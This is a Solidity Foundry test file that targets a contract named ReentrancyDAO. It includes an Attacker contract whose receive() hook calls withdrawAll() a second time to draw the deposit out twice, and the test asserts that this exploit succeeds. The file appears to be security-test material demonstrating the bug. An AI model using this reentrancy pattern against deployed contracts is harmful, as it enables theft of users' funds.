
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // We need to increase the 'balance' state variable of the DAO so that the re-entrant call
        // does not revert due to arithmetic underflow (balance -= oCredit).
        // We simulate a legitimate user (this test contract) depositing funds first.
        vm.deal(address(this), attackVal * 2);
        _contractUnderTest.deposit{value: attackVal}();

        // --- 3. Funding ---
        // Fund the Attacker so it can make the initial deposit.
        vm.deal(address(_attacker), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to establish credit
        _victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 2. Call the vulnerable function.
        _victim.withdrawAll();

        // 3. Verify Success Conditions.
        // If reentrancy succeeded, we withdrew 'val' twice (once normally, once via reentrancy).
        // Balance should be initial + 2 * val.
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            // Re-enter the contract
            attackCallCount++;
            _victim.withdrawAll();
        }
    }
}
